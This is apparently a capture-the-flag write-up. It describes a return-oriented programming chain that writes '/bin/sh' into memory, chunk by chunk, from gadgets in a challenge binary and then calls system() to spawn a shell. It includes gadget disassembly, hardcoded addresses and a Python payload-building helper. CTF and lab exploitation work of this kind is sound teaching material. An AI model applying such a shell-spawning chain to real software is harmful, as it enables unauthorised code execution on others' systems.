# solution
This binary is a little bit harder.
We do have a call to system()
But we don't have /bin/sh anywhere and no chance to leak a libc base address (Hope so :-D ).
So we need to build our /bin/sh using what we have, and this is a famous poem that gets printed to the shell.

By using existing gadgets like:

 804858f:       5f                      pop    edi
 8048590:       c3                      ret
 8048591:       5e                      pop    esi
 8048592:       c3                      ret
 8048593:       31 c0                   xor    eax,eax
 8048595:       c3                      ret
 8048596:       89 17                   mov    DWORD PTR [edi],edx
 8048598:       c3                      ret
 8048599:       8b 16                   mov    edx,DWORD PTR [esi]
 804859b:       c3                      ret

we can construct a ropchain which can construct our string char/chunk by char/chunk.

Address to store our created string: 0x804a020
-> should come into RDI
We can use mov DWORD PTR [edi], edx to write to that address what we have in edx!
We get a value into edx via "mov edx, DWORD PTR [esi]"
esi should then point into a address into our poem from where 4 bytes will be copied into edx.
The value for esi, we get from the pop esi gadget

Example for copying the very first char "/" of /bin/sh (or maybe better: put / as the very first char and some junk which will be overwritten starting at pos1 in the next iteration with "bi" -> /bi.... etc.

xor = 80486cd war 8048593 -> offset 13a
POPEDI=0x804858f
POPESI=0x8048591
MOV=0x8048596
MOVESI=0x8048599
START=0x804a020
SYSTEM=0x804850c

def poppi(offset, ressource):
    global payload
    payload += p32(POPEDI)
    payload += p32(START+offset)
    payload += p32(POPESI)
    payload += p32(ressource)
    payload += p32(MOVESI)
    payload += p32(MOV)

poppi(0, 0x804a5b2) --> puts /... to 0x804a020
poppi(1, 0x804a451) --> puts bi.. to 0x804a021 -> 0x804a020 = /bi...

see solution.py
